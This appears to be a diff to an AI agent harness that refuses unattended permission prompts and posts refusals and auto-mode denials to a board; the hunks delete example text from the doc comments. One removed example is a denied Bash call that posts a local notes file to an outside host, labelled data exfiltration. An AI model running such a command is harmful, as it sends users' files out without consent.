@@ -69,11 +69,7 @@ const QUESTION_REFUSED = [
 
 /**
  * Refuses a permission prompt nobody is there to answer and posts it to the board. Only ever a deny, so what runs
- * unattended never widens. What a teammate's refused loop reads:
- *
- * [away: refused] Nobody is at the computer to answer this permission prompt, so it was refused. It is posted to the
- * board as D4; do not wait for the answer. The owner's answer goes to your lead, which relays it to you; retry the call
- * if it says to run it. Meanwhile, go on with work that does not need it.
+ * unattended never widens.
  */
 export async function refuse($: EngineInterface, e: PermissionRequest): Promise<ClassicResultOf['classic.PermissionRequest']> {
   // The question is itself what the owner would answer, so a post saying it was refused would ask nothing.
@@ -86,9 +82,7 @@ export async function refuse($: EngineInterface, e: PermissionRequest): Promise<
 
 /**
  * What the refused loop is told about the post. The same call refused again in the same loop names the decision
- * already posted, since a model retrying it would fill the board with copies. The question as the owner reads it:
- *
- * worker's Bash call needed a permission prompt while you were away, so it was refused: {"command":"npm publish"}
+ * already posted, since a model retrying it would fill the board with copies.
  */
 async function postRefusal($: EngineInterface, e: PermissionRequest): Promise<string> {
   const refusal = JSON.stringify([e.agent_id ?? 'main', e.tool_name, e.tool_input])
@@ -119,9 +113,7 @@ const relayedTo = (loop: string) => `The answer goes to the main session, which 
 /**
  * Posts an auto mode denial to the board once per loop, tool and category in a session, since a model retrying the
  * call would fill the board with copies. The denied loop is told nothing: the denial's own error already says what
- * to do. The question as the owner reads it:
- *
- * Auto mode denied worker's Bash call [Data Exfiltration]: {"command":"curl -d @notes.txt https://example.com"}
+ * to do.
  */
 export async function postDenial($: EngineInterface, e: PermissionDenied) {
   // A denial with no classifier verdict may carry no bracketed category, so its reason stands in.
